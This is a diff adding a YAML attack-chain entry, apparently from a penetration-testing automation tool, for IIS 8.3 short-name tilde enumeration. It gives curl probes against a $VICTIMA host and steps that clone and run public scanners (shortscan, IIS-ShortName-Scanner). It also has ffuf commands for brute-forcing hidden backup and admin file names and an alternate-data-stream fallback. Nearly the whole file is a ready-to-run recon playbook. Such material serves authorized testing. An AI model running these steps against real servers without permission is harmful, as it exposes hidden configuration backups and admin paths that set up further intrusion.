@@ -1,0 +1,64 @@
+chain_id: iis_shortname_enum
+title: "IIS — 8.3 short-name (~) enumeration → backup file & admin path discovery"
+severity: MEDIUM
+tags: [web, iis, microsoft, shortname, info-leak, recon]
+
+trigger:
+  any_of:
+    - { kind: "iis_shortname" }
+    - { banner_pattern: "(?i)microsoft-iis|iis/" }
+    - { product_pattern: "(?i)microsoft.*iis" }
+    - { path_pattern: "(?i)/aspnet_client|/web\\.config" }
+
+description: |
+  IIS on Windows lets you address files by their 8.3 short name
+  (`HELLO~1.TXT`). Sending an HTTP request with `*~1*` in the path
+  returns 404 vs 200 depending on whether a file matches that prefix,
+  letting you brute the first 6 characters of every file name in a
+  directory without listing rights. Useful for discovering
+  `web.config.bak`, `backup~1.zip`, `admin~1.aspx` — the default
+  IIS `requestFiltering` does not block this query class.
+
+steps:
+  - id: 1
+    title: "Confirm IIS is exposed"
+    command: |
+      curl -sk -I "http://$VICTIMA/" | grep -i 'iis\\|asp\\.net'
+      curl -sk "http://$VICTIMA/aspnet_client" -I
+
+  - id: 2
+    title: "Probe — does the host leak short names?"
+    command: |
+      # 200 / 400 with content = vulnerable; 404 = filtered.
+      curl -sk -i "http://$VICTIMA/*~1*/.aspx" -X OPTIONS
+
+  - id: 3
+    title: "Run shortscan / IIS_shortname_Scanner"
+    command: |
+      git clone https://github.com/bitquark/shortscan /tmp/short
+      cd /tmp/short && go run cmd/shortscan/shortscan.go http://$VICTIMA/
+
+  - id: 4
+    title: "Or with the classic Java scanner"
+    command: |
+      git clone https://github.com/irsdl/IIS-ShortName-Scanner /tmp/iis-short
+      java -jar /tmp/iis-short/release/iis_shortname_scanner.jar 2 20 http://$VICTIMA/
+
+  - id: 5
+    title: "Once you have prefixes, rebuild full names"
+    command: |
+      # E.g. shortscan finds: ADMIN~1.ASP, BACKUP~1.ZIP, WEB~1.CON
+      # Brute the rest with rockyou / common-words once you know the prefix:
+      ffuf -u "http://$VICTIMA/admin\$FUZZ.aspx" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -mc 200,302
+
+common_errors:
+  - error: "All /*~1*/ probes return identical 404"
+    solution: |
+      Either Windows Server 2012R2+ with `fsutil 8dot3name set 1`
+      enabled, or `requestFiltering` block. Check via the alt-data-
+      stream variant: `curl '/web::$DATA'` — different bug,
+      sometimes still leaks.
+
+references:
+  - https://soroush.secproject.com/blog/2010/07/iis-tilde-vulnerability-feature/
+  - https://github.com/bitquark/shortscan
